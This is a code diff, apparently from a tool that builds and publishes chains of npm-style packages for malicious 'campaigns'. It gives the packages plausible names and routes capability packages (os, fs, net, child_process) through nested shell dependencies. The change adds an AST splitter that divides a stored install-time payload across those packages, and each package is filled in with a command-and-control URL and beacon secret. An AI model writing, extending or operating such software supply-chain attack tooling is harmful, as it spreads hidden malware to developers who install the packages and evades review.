@@ -128,9 +128,8 @@ const SUFFIXES = [
   '-common', '-base', '-helpers', '-lib', '-module', '-service',
 ];
 
-type CapRole = 'cap-os' | 'cap-fs' | 'cap-net' | 'cap-cp';
-const CAP_ROLES: CapRole[] = ['cap-os', 'cap-fs', 'cap-net', 'cap-cp'];
-const CAP_FILES: Record<CapRole, string> = {
+const DEFAULT_CAP_ROLES = ['cap-os', 'cap-fs', 'cap-net', 'cap-cp'];
+const DEFAULT_CAP_FILES: Record<string, string> = {
   'cap-os': 'cap-os.js',
   'cap-fs': 'cap-fs.js',
   'cap-net': 'cap-net.js',
@@ -142,33 +141,28 @@ type ChainNode = { name: string; role: string; deps: string[]; jsFile: string; d
 export function generateCampaignChain(
   baseName: string,
   depth: number,
+  capRoles?: string[],
 ): { entrypoint: ChainNode; nodes: ChainNode[] } {
+  const roles = capRoles ?? DEFAULT_CAP_ROLES;
   const shuffled = [...SUFFIXES].sort(() => Math.random() - 0.5);
   let si = 0;
   const pick = () => {
-    if (si >= shuffled.length) si = 0; // wrap if we need more names than suffixes
+    if (si >= shuffled.length) si = 0;
     return baseName + shuffled[si++];
   };
 
   const nodes: ChainNode[] = [];
-  // For each capability: cap package → depth shell packages → entrypoint's dep
-  const outerShellNames: Record<CapRole, string> = {} as Record<CapRole, string>;
+  const outerShellNames: Record<string, string> = {};
   const entryDepReplacements: Record<string, string> = {};
 
-  // Placeholder mapping from CAP_ROLE to entrypoint.js placeholder
-  const capPlaceholders: Record<CapRole, string> = {
-    'cap-os': '__DEP_OS__',
-    'cap-fs': '__DEP_FS__',
-    'cap-net': '__DEP_NET__',
-    'cap-cp': '__DEP_CP__',
-  };
+  // Generate placeholder from role: cap-os → __CAP_OS__, cap-child_process → __CAP_CHILD_PROCESS__
+  const placeholderForRole = (role: string) => `__${role.toUpperCase().replace(/-/g, '_')}__`;
 
-  for (const role of CAP_ROLES) {
-    // Capability package (leaf)
+  for (const role of roles) {
     const capName = pick();
-    nodes.push({ name: capName, role, deps: [], jsFile: CAP_FILES[role] });
+    const jsFile = DEFAULT_CAP_FILES[role] ?? 'index.js';
+    nodes.push({ name: capName, role, deps: [], jsFile });
 
-    // Build shell chain from cap outward
     let prevName = capName;
     for (let d = 0; d < depth; d++) {
       const shellName = pick();
@@ -182,7 +176,7 @@ export function generateCampaignChain(
       prevName = shellName;
     }
     outerShellNames[role] = prevName;
-    entryDepReplacements[capPlaceholders[role]] = prevName;
+    entryDepReplacements[placeholderForRole(role)] = prevName;
   }
 
   const entrypointName = pick();
@@ -205,24 +199,58 @@ export function publishCampaign(
   accountId: number,
   depth: number,
   beaconSecret: string,
-): { success: boolean; packages: { name: string; role: string; status: string; output: string }[] } {
+  payloadId?: number,
+): { success: boolean; packages: { name: string; role: string; status: string; output: string }[]; analysis?: import('./splitter').SplitAnalysis } {
   const acct = db.prepare('SELECT * FROM accounts WHERE id = ?').get(accountId) as Account | undefined;
   if (!acct) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: 'account not found' }] };
 
-  const chain = generateCampaignChain(campaignName, depth);
-  const allNodes = [...chain.nodes, chain.entrypoint]; // publish leaves first, entry last
+  // Determine split: if payloadId provided, use AST splitter; otherwise use legacy templates
+  let splitResult: import('./splitter').SplitResult | null = null;
+  let capRoles: string[] | undefined;
+  let splitFiles: Map<string, string> | undefined; // role → JS source
+
+  if (payloadId) {
+    const payload = db.prepare('SELECT install_js FROM payloads WHERE id = ?').get(payloadId) as { install_js: string } | undefined;
+    if (!payload) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: 'payload not found' }] };
+
+    const { splitPayload, capPlaceholders } = require('./splitter') as typeof import('./splitter');
+    splitResult = splitPayload(payload.install_js);
+    capRoles = splitResult.analysis.found;
+    splitFiles = new Map<string, string>();
+    for (const cap of splitResult.caps) {
+      splitFiles.set(cap.role, cap.code);
+    }
+  }
+
+  const chain = generateCampaignChain(campaignName, depth, capRoles);
+  const allNodes = [...chain.nodes, chain.entrypoint];
   const results: { name: string; role: string; status: string; output: string }[] = [];
   let allOk = true;
 
-  // Create campaign record
-  db.prepare("INSERT INTO campaigns (name, account_id, depth, status) VALUES (?, ?, ?, 'pending')").run(campaignName, accountId, depth);
+  db.prepare("INSERT INTO campaigns (name, account_id, depth, status, payload_id, split_analysis) VALUES (?, ?, ?, 'pending', ?, ?)").run(
+    campaignName, accountId, depth, payloadId ?? null,
+    splitResult ? JSON.stringify(splitResult.analysis) : null,
+  );
   const campaign = db.prepare('SELECT id FROM campaigns WHERE name = ?').get(campaignName) as { id: number };
 
   for (const node of allNodes) {
-    // Build package files
-    let jsRaw = fs.readFileSync(path.join(CAMPAIGN_DIR, node.jsFile), 'utf8');
+    let jsRaw: string;
 
-    // Apply dependency name replacements
+    if (splitResult && splitFiles) {
+      // AST-split mode
+      if (node.role === 'entrypoint') {
+        jsRaw = splitResult.entrypoint;
+      } else if (node.role === 'shell') {
+        jsRaw = fs.readFileSync(path.join(CAMPAIGN_DIR, 'shell.js'), 'utf8');
+      } else {
+        jsRaw = splitFiles.get(node.role) ?? '';
+      }
+    } else {
+      // Legacy template mode
+      jsRaw = fs.readFileSync(path.join(CAMPAIGN_DIR, node.jsFile), 'utf8');
+    }
+
+    // Apply dependency name replacements (shell → dep pkg name, entrypoint → cap pkg names)
     if (node.depReplacements) {
       for (const [placeholder, replacement] of Object.entries(node.depReplacements)) {
         jsRaw = jsRaw.replaceAll(placeholder, replacement);
@@ -232,7 +260,6 @@ export function publishCampaign(
     // Apply standard placeholders
     jsRaw = renderTemplate(jsRaw, node.name, acct.c2_url, beaconSecret);
 
-    // Build package.json
     const depsObj = node.deps.length > 0
       ? node.deps.reduce((acc, dep) => ({ ...acc, [dep]: '1.0.0' }), {} as Record<string, string>)
       : {};
@@ -251,7 +278,6 @@ export function publishCampaign(
       'index.js': jsRaw,
     };
 
-    // Record in DB
     db.prepare("INSERT INTO packages (name, status, account_id, campaign_id, role) VALUES (?, 'pending', ?, ?, ?)").run(
       node.name, accountId, campaign.id, node.role,
     );
@@ -268,7 +294,7 @@ export function publishCampaign(
     campaign.id,
   );
 
-  return { success: allOk, packages: results };
+  return { success: allOk, packages: results, analysis: splitResult?.analysis };
 }
 
 export function deleteCampaign(campaignId: number): { success: boolean; results: { name: string; ok: boolean }[] } {
